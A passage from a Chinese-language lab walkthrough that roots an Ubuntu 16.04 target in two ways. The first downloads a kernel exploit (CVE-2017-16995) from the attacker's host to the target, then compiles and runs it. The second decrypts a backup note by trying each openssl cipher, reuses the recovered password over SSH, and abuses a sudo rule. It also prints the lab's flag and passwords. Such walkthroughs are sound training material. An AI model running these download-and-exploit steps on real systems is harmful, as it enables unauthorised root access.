Linux Kernel 4.10.5 / < 4.14.3 (Ubuntu) - DCCP Socket Use- | linux/dos/43234.c
Linux Kernel < 4.13.9 (Ubuntu 16.04 / Fedora 27) - Local P | linux/local/45010.c
Ubuntu < 15.10 - PT Chown Arbitrary PTs Access Via User Na | linux/local/41760.txt

----------------------------------------------------------- ---------------------------------

Shellcodes: No Results
Papers: No Results
```

copy一下：

```shell
╭─ /home/kali ················································ with root@kali at 05:27:18 ─╮
╰─❯ searchsploit -m 45010                                                                 ─╯
  Exploit: Linux Kernel < 4.13.9 (Ubuntu 16.04 / Fedora 27) - Local Privilege Escalation
      URL: https://www.exploit-db.com/exploits/45010
     Path: /usr/share/exploitdb/exploits/linux/local/45010.c
    Codes: CVE-2017-16995
 Verified: True
File Type: C source, ASCII text
Copied to: /home/kali/45010.c
```

本地python起一个服务器，靶机下载C的exp源码

```python
python3 -c "import urllib.request; urllib.request.urlretrieve('http://192.168.8.114:8080/45010.c', '/tmp/45010.c')"
```

靶机gcc编译并执行exp（如果在本机编译可能会导致glibc版本问题无法执行生成之后的程序）

```shell
www-data@ubuntu:/tmp$ gcc 45010.c -o exp
www-data@ubuntu:/tmp$ chmod +x exp 
www-data@ubuntu:/tmp$ ./exp
[.] 
[.] t(-_-t) exploit for counterfeit grsec kernels such as KSPP and linux-hardened t(-_-t)
[.] 
[.]   ** This vulnerability cannot be exploited at all on authentic grsecurity kernel **
[.] 
[*] creating bpf map
[*] sneaking evil bpf past the verifier
[*] creating socketpair()
[*] attaching bpf backdoor to socket
[*] skbuff => ffff9001f76acb00
[*] Leaking sock struct from ffff9001f803c800
[*] Sock->sk_rcvtimeo at offset 592
[*] Cred structure at ffff9001fa488900
[*] UID from cred structure: 33, matches the current: 33
[*] hammering cred structure at ffff9001fa488900
[*] credentials patched, launching shell...

# id

uid=0(root) gid=0(root) groups=0(root),33(www-data)
# 
```


root flag：b2b17036da1de94cfb024540a8e7075a

### 4.1解法2 opeenssl 解密提权

其实在实战中应该尽量避免使用内核提权，这样可能会导致业务系统的中断，因此我们使用其他思路

在上一轮的信息收集中 ，我们发现了enc这个文件，执行发现要密码

```shell
www-data@ubuntu:/home/saket$ ./enc
enter password: 
```

尝试凭据复用：follow_the_ippsec 

依然失败，继续尝试信息收集，查看/opt目录，发现一个有趣的东西：

```shell
www-data@ubuntu:/home$ cd /opt\
> ^C
www-data@ubuntu:/home$ cd /opt 
www-data@ubuntu:/opt$ ls
backup
www-data@ubuntu:/opt$ cd backup/
www-data@ubuntu:/opt/backup$ ls
server_database
www-data@ubuntu:/opt/backup$ cd server_database/
www-data@ubuntu:/opt/backup/server_database$ ls
backup_pass  {hello.8}
www-data@ubuntu:/opt/backup/server_database$ cat backup_pass 
your password for backup_database file enc is 

"backup_password"


Enjoy!
www-data@ubuntu:/opt/backup/server_database$ 
```

这里也可也更正规些：

```shell
find / -name "*back*"
```

  查找文件名，发现/opt 下的/backup

文件提示enc 密码是backup_password，执行一下：

```shell
Sorry, try again.
[sudo] password for www-data: 
Sorry, try again.
[sudo] password for www-data: 

sudo: 3 incorrect password attempts
www-data@ubuntu:/home/saket$ ./enc 
./enc
enter password: backup_password
backup_password
good
/bin/cp: cannot stat '/root/enc.txt': Permission denied
/bin/cp: cannot stat '/root/key.txt': Permission denied
www-data@ubuntu:/home/saket$ sudo /home/saket/enc
sudo /home/saket/enc
enter password: backup_password
backup_password
good
www-data@ubuntu:/home/saket$ ls
ls
enc  enc.txt  key.txt  password.txt  user.txt
www-data@ubuntu:/home/saket$ 


```

cat这两个文件：

```shell
www-data@ubuntu:/home/saket$ cat key.txt
cat key.txt
I know you are the fan of ippsec.

So convert string "ippsec" into md5 hash and use it to gain yourself in your real form.
www-data@ubuntu:/home/saket$ cat en
cat enc
cat: enc: Permission denied
www-data@ubuntu:/home/saket$ cat enc.txt
cat enc.txt
nzE+iKr82Kh8BOQg0k/LViTZJup+9DReAsXd/PCtFZP5FHM7WtJ9Nz1NmqMi9G0i7rGIvhK2jRcGnFyWDT9MLoJvY1gZKI2xsUuS3nJ/n3T1Pe//4kKId+B3wfDW/TgqX6Hg/kUj8JO08wGe9JxtOEJ6XJA3cO/cSna9v3YVf/ssHTbXkb+bFgY7WLdHJyvF6lD/wfpY2ZnA1787ajtm+/aWWVMxDOwKuqIT1ZZ0Nw4=
www-data@ubuntu:/home/saket$ 
```

得到了一个提示：key的值为md5加密以及还有一串密文，该文件叫enc，且openssl 中也有这个东西，还给了Key，于是就有端联想，下一步的工具选用为openssl

```shell
www-data@ubuntu:/home/saket$ echo -n "ippsec" | md5sum
echo -n "ippsec" | md5sum
366a74cb3c959de17d61db30591c39d1  -
www-data@ubuntu:/home/saket$ 
```

使用echo -n 去掉结尾换行符，提取key 366a74cb3c959de17d61db30591c39d1 ，但是这里还不是我们想要的，我们先将openssl支持的加密方式导出 

```shell
╭─ /home/kali ··························································································································· with root@kali at 04:08:31 ─╮
╰─❯ openssl                                                                                                                                                          ─╯
help:

Standard commands
asn1parse         ca                ciphers           cmp               
cms               crl               crl2pkcs7         dgst              
dhparam           dsa               dsaparam          ec                
ecparam           enc               engine            errstr            
fipsinstall       gendsa            genpkey           genrsa            
help              info              kdf               list              
mac               nseq              ocsp              passwd            
pkcs12            pkcs7             pkcs8             pkey              
pkeyparam         pkeyutl           prime             rand              
rehash            req               rsa               rsautl            
s_client          s_server          s_time            sess_id           
skeyutl           smime             speed             spkac             
srp               storeutl          ts                verify            
version           x509              

Message Digest commands (see the `dgst' command for more details)
blake2b512        blake2s256        md4               md5               
rmd160            sha1              sha224            sha256            
sha3-224          sha3-256          sha3-384          sha3-512          
sha384            sha512            sha512-224        sha512-256        
shake128          shake256          sm3               

Cipher commands (see the `enc' command for more details)
aes-128-cbc       aes-128-ecb       aes-192-cbc       aes-192-ecb       
aes-256-cbc       aes-256-ecb       aria-128-cbc      aria-128-cfb      
aria-128-cfb1     aria-128-cfb8     aria-128-ctr      aria-128-ecb      
aria-128-ofb      aria-192-cbc      aria-192-cfb      aria-192-cfb1     
aria-192-cfb8     aria-192-ctr      aria-192-ecb      aria-192-ofb      
aria-256-cbc      aria-256-cfb      aria-256-cfb1     aria-256-cfb8     
aria-256-ctr      aria-256-ecb      aria-256-ofb      base64            
bf                bf-cbc            bf-cfb            bf-ecb            
bf-ofb            camellia-128-cbc  camellia-128-ecb  camellia-192-cbc  
camellia-192-ecb  camellia-256-cbc  camellia-256-ecb  cast              
cast-cbc          cast5-cbc         cast5-cfb         cast5-ecb         
cast5-ofb         des               des-cbc           des-cfb           
des-ecb           des-ede           des-ede-cbc       des-ede-cfb       
des-ede-ofb       des-ede3          des-ede3-cbc      des-ede3-cfb      
des-ede3-ofb      des-ofb           des3              desx              
rc2               rc2-40-cbc        rc2-64-cbc        rc2-cbc           
rc2-cfb           rc2-ecb           rc2-ofb           rc4               
rc4-40            seed              seed-cbc          seed-cfb          
seed-ecb          seed-ofb          sm4-cbc           sm4-cfb           
sm4-ctr           sm4-ecb           sm4-ofb           zlib              
zstd              
```

提取Cipher commands 部分为每行一个：

```shell
╭─ /home/kali ································································································· ✔ 1|0 with root@kali at 04:12:49 ─╮
╰─❯ cat Crypter |  xargs -n1                                                                                                                  
aes-128-cbc
aes-128-ecb
aes-192-cbc
aes-192-ecb
aes-256-cbc
aes-256-ecb
aria-128-cbc
aria-128-cfb
aria-128-cfb1
aria-128-cfb8
aria-128-ctr
aria-128-ecb
aria-128-ofb
aria-192-cbc
aria-192-cfb
aria-192-cfb1
aria-192-cfb8
aria-192-ctr
aria-192-ecb
aria-192-ofb
aria-256-cbc
aria-256-cfb
aria-256-cfb1
aria-256-cfb8
aria-256-ctr
aria-256-ecb
aria-256-ofb
base64
bf
bf-cbc
bf-cfb
bf-ecb
bf-ofb
camellia-128-cbc
camellia-128-ecb
camellia-192-cbc
camellia-192-ecb
camellia-256-cbc
camellia-256-ecb
cast
cast-cbc
cast5-cbc
cast5-cfb
cast5-ecb
cast5-ofb
des
des-cbc
des-cfb
des-ecb
des-ede
des-ede-cbc
des-ede-cfb
des-ede-ofb
des-ede3
des-ede3-cbc
des-ede3-cfb
des-ede3-ofb
des-ofb
des3
desx
rc2
rc2-40-cbc
rc2-64-cbc
rc2-cbc
rc2-cfb
rc2-ecb
rc2-ofb
rc4
rc4-40
seed
seed-cbc
seed-cfb
seed-ecb
seed-ofb
sm4-cbc
sm4-cfb
sm4-ctr
sm4-ecb
sm4-ofb
zlib
zstd

╭─ /home/kali ······································································································· with root@kali at 04:12:59 ─╮
╰─❯ cat Crypter |  xargs -n1 > Crypt1   
```

接着再次查看帮助：

```shell
www-data@ubuntu:/home/saket$ openssl enc -help
openssl enc -help
unknown option '-help'
options are
-in <file>     input file
-out <file>    output file
-pass <arg>    pass phrase source
-e             encrypt
-d             decrypt
-a/-base64     base64 encode/decode, depending on encryption flag
-k             passphrase is the next argument
-kfile         passphrase is the first line of the file argument
-md            the next argument is the md to use to create a key
                 from a passphrase.  One of md2, md5, sha or sha1
-S             salt in hex is the next argument
-K/-iv         key/iv in hex is the next argument
-[pP]          print the iv/key (then exit if -P)
-bufsize <n>   buffer size
-nopad         disable standard block padding
-engine e      use engine e, possibly a hardware device.
```

得到一条重要信息：  key/iv in hex is the next argument ，我们还需要把key的md5转换为hex 

```shell
┌──(kali㉿kali)-[~]
└─$ echo -n "366a74cb3c959de17d61db30591c39d1" | xxd -p | tr -d "\n"
3336366137346362336339353964653137643631646233303539316333396431  
```

hex已经转换完毕，接下来就是简单的脚本遍历：

```shell
╭─ /home/kali ······································································································································· with root@kali at 04:44:43 ─╮
╰─❯for types in $(cat Crypt1);do echo "nzE+iKr82Kh8BOQg0k/LViTZJup+9DReAsXd/PCtFZP5FHM7WtJ9Nz1NmqMi9G0i7rGIvhK2jRcGnFyWDT9MLoJvY1gZKI2xsUuS3nJ/n3T1Pe//4kKId+B3wfDW/TgqX6Hg/kUj8JO08wGe9JxtOEJ6XJA3cO/cSna9v3YVf/ssHTbXkb+bFgY7WLdHJyvF6lD/wfpY2ZnA1787ajtm+/aWWVMxDOwKuqIT1ZZ0Nw4=" | openssl enc -d -a -$types  -K 3336366137346362336339353964653137643631646233303539316333396431 2>/dev/null ;echo $types;done 
```

解释：将cat Crypt1的结果放进types变量，再告诉openssl 使用openssl enc 进行解码操作，由于这串字符使用base64进行了二次编码，再使用-$types 设置遍历Crypt1的密文类型，最后使用hex之后的md5 key进行解密操作，将报错丢弃，并输出密文类型

```shell
╭─ /home/kali ································································································································· х INT with root@kali at 04:59:36 ─╮
╰─❯ for types in $(cat Crypt1);do echo "nzE+iKr82Kh8BOQg0k/LViTZJup+9DReAsXd/PCtFZP5FHM7WtJ9Nz1NmqMi9G0i7rGIvhK2jRcGnFyWDT9MLoJvY1gZKI2xsUuS3nJ/n3T1Pe//4kKId+B3wfDW/TgqX6Hg/kUj8JO08wGe9JxtOEJ6XJA3cO/cSna9v3YVf/ssHTbXkb+bFgY7WLdHJyvF6lD/wfpY2ZnA1787ajtm+/aWWVMxDOwKuqIT1ZZ0Nw4=" | openssl enc -d -a -$types  -K 3336366137346362336339353964653137643631646233303539316333396431 2>/dev/null ;echo $types;done 
aes-128-cbc
l{���[��7�ƏmfE��K����;0�`Z▒�� :�y��N�.�Fj�|z�x�G���rd��/��
                                                          �:�Z91�yMV���@��S▒u����_j,����^+�FAC��ﴌ6���-��~��I�_���%���C���Դ��:��}T�q�4�同��#��ʛaes-128-ecb
aes-192-cbc
~I�l2UFײ:H3V�>Z����§��N[sgħ��:��-]�����v;ń#�M��|g��
            �|&�As
                  ��    �B0��mĖ�*�0r������{Hw� Ƕ�~�g�X�2▒�'+��+�����[D���5��d����!%o    {aes-192-ecb
aes-256-cbc
Dont worry saket one day we will reach to
our destination very soon. And if you forget 
your username then use your old password
==> "tribute_to_ippsec"

Victor,aes-256-ecb
aria-128-cbc
aria-128-cfb
aria-128-cfb1
aria-128-cfb8
aria-128-ctr
t[�����/<T5u���L?c���4��G�▒�ki*�U�f��E0��o��qp���õ/▒���@�wh��G�
ec�r�������]1��9ґp�IDW�p�wj��%�f�~2�LD▒�aria-128-ecb           �?g�
aria-128-ofb
aria-192-cbc
aria-192-cfb
aria-192-cfb1
aria-192-cfb8
aria-192-ctr
<�▒�bØ�H�� TG
             \�|��$�4���E����F���lS9��s��5��IV:W�[ijn1��E����=��YShL�����Tsq�"���{L�,"
                                                                                      �q�7w1|����s�;�d���/�S��▒7���%h��7�(
"yR����v�2�aria-192-ecb
aria-192-ofb
aria-256-cbc
aria-256-cfb
aria-256-cfb1
aria-256-cfb8
aria-256-ctr
,_���U(t��^>�3cm��=��~�V�ĩx&q�k����!�Z)�ͻ�x�I�䞝JW��▒���a�P����U����N5���Q�c�^Ƕ�>       �W*��W����)~Rc#�c`ҋ���u�IPV����yX����]Oan�+�vJ▒1��aria-256-ecb
aria-256-ofb
?L.�ocX(���K��r�t�=���B�w�w����8*_���E#�������m8Bz\�7p��Jv��v�,6ב��;X�G'+��P���X�׿;j;f���YS1
                                                                                            �
��Ֆt7base64
bf
bf-cbc
bf-cfb
1�a��4�#�yQ.��H���
                  ��8iN�HAn*�RXz{�GS��u�.��ߩ�Y���(�$Ҙ��z�gwF
1�EixN4��Rs�8�e�∌K      �B�6M�ە�^vay��IQg
b����)-�wK8Qwx���ϥ��n�U"��1a|$t���HLF�σbf-ecb
bf-ofb
camellia-128-cbc
�!�#bW'ˀ�KE;!�"��{cyF
                     ���7^��4�^�▒�9v��N�Ŧ+2f
���{��u\Z�|�2   �0�'Z�j�wUpRd��ew�:�˪\�     �M�TkG%�Nƃ�g�S����Ր��O�{�osV�%�؆��c����0�a�YDD0d�Y�
C&camellia-128-ecb
camellia-192-cbc
�����?�E��wUaf�,T�]6�o�*��h}������J���7c�ю��@�J7��
                                                  ��L�������~�2C�L34�4ĺ�s��I�$>���7��f����O
                                                                                           �+�{liSLʉ���,��E�U   WǜS`Gsj����6�/��t~camellia-192-ecb
camellia-256-cbc
ހ��Ӑ��<�%wLC�~u����pgu�F��:XM��Jc�|����Ř▒��6"�����]7����#����Oܛ�=�
���K��F$��L����IF��u4�fE+.�-W����2
%�(�xC�E����s:�j��7��d�ئ!jc���S��2ʤcamellia-256-ecb
cast
cast-cbc
cast5-cbc
cast5-cfb
F�?�<>�~�(�E}�5��\��▒S��4NZ硶Kt��A�fT���C�����R6�������7������-A|��5���Ƞ�`;R��c&m#m�T<x�cq=�oh�▒�0Wb�l��aB�aZ�z"��fTːq_ԙS���&Y�7�^;��]�9�t s�cast5-ecb
cast5-ofb
des
des-cbc
des-cfb
�Ղ�$�%�.�%��r�A�z��9�_�����;�E��f�|F:{��mfq2�j� >�<����0����Ӓ�������2�&?r�'��:k(#j�0N!���xU0��쯾6b�>���o)������des-ecb

+�D��L�Ҁ�7(��[x��%����E=�<>d&�N�\�D���
��c�*� �`���OjJ-�X�{�'��V�X{g��C▒J,�E
                                     �7�W3η���T��^T��DK=���w�j��&��J?����h(Վ�dId�
                                                                                 6�z��i���FYDN
                                                                                              Q��gdes-ede
des-ede-cbc
des-ede-cfb
des-ede-ofb
6^{�h�R�J-'�yAv/>c�GHA�זϞ�V����$�㢡U�oX�+(���{X���)#KB��g,�5��▒�]��r恘`�����e�9���H▒�k��n�D�i|a��<�\��Kc▒&9S�O��τjg�)�V��-�[7�=��ݹgT��Thdes-ede3
des-ede3-cbc
des-ede3-cfb
des-ede3-ofb
des-ofb
des3
desx
rc2
rc2-40-cbc
rc2-64-cbc
rc2-cbc
rc2-cfb
�>�kO;}r�HLp
��0�+y@�m�^������'���L9*�X�A9{G�+��"��@w���8��wģ�"�TE�����uq(f�rc2-ecb
rc2-ofb
����3�'�/?�PR�| {���B�t�r_���?3�&
����I�9/`�v�����vz~z�(���5��k��iG�[�<gG�▒���j`*/�f�2�
                                                     �VX�I.p�Y2DY4��=C��*���Rl!F��▒�t�fyE�<i��y!��MK�N� =�<rc4
����NEI�g�▒�?�L��7�Aˍ�ZV.D*��d���Ʀ�2�J���fԦW    �<���,3���W��rIJ�q"��n���#雥��q����'��N6�(
A5-j��y]G!a��O��� z�[,?�T�r;rc4-40
seed
seed-cbc
seed-cfb
+��     ��A��!�]v6
�q�▒{T�:�$����  �Qr������4Tԥ�OY�▒�MU�*��{H�$�%�6X��Vc�F�W,���&<�1�GE2��{����4��Q0�{^;!J*��טŮ��PdDXH��Ɍ  �#�炅;�<DD��f�
                                                                                                                      tseed-ecb
seed-ofb
sm4-cbc
sm4-cfb
sm4-ctr
d��;�����c�?�>����=���)�,��Ǵx�]����+aT�Ja[�ˇ�����0�H����h�A��
                                                              pvyk���]!W�'�m�۽w�v^����n��᥊+���eB_ȓ��Jw�N���{7 ����d�B%A�␪��e��/�7=��\sm4-ecb
sm4-ofb
zlib
zstd

```

我们得知该密文类型为：aes-ecb-256在众多报错中发现一行

```
Dont worry saket one day we will reach to
our destination very soon. And if you forget 
your username then use your old password
==> "tribute_to_ippsec"
```

ssh登录saket账户：

```shell
╭─ /home/kali ··························································································································· took 2m 39s with root@kali at 04:54:53 ─╮
╰─❯ ssh saket@192.168.8.47                                                                                                                                                       ─╯
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
saket@192.168.8.47's password: 
Welcome to Ubuntu 16.04.3 LTS (GNU/Linux 4.10.0-28-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

194 packages can be updated.
1 update is a security update.

New release '18.04.6 LTS' available.
Run 'do-release-upgrade' to upgrade to it.

*** System restart required ***

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.


The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

Last login: Sun Jul  5 01:52:19 2026 from 192.168.8.114
$ 

```

接着sudo -l

```shell
saket@ubuntu:~$ sudo -l
Matching Defaults entries for saket on ubuntu:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User saket may run the following commands on ubuntu:
    (root) NOPASSWD: /home/victor/undefeated_victor
saket@ubuntu:~$ 
```

直接运行：

```shell
saket@ubuntu:~$ sudo /home/victor/undefeated_victor
if you can defeat me then challenge me in front of you
/home/victor/undefeated_victor: 2: /home/victor/undefeated_victor: /tmp/challenge: not found
saket@ubuntu:~$ 
```

尝试将/bin/bash写入/tmp/challenge 

```shell
saket@ubuntu:~$ sudo /home/victor/undefeated_victor
if you can defeat me then challenge me in front of you
/home/victor/undefeated_victor: 2: /home/victor/undefeated_victor: /tmp/challenge: not found
saket@ubuntu:~$ echo "/bin/bash" > /tmp/challenge
saket@ubuntu:~$ sudo /home/victor/undefeated_victor
if you can defeat me then challenge me in front of you
/home/victor/undefeated_victor: 2: /home/victor/undefeated_victor: /tmp/challenge: Permission denied
saket@ubuntu:~$ 

```

发现需要执行权限：

chmod +x /tmp/challenge 

```shell
saket@ubuntu:~$ chmod +x /tmp/challenge 
saket@ubuntu:~$ sudo /home/victor/undefeated_victor
if you can defeat me then challenge me in front of you
root@ubuntu:~# id
uid=0(root) gid=0(root) groups=0(root)
root@ubuntu:~# ls
enc  enc.txt  key.txt  password.txt  user.txt
root@ubuntu:~# cat /root/root.txt 
b2b17036da1de94cfb024540a8e7075a
root@ubuntu:~# 
```

成功获取flag
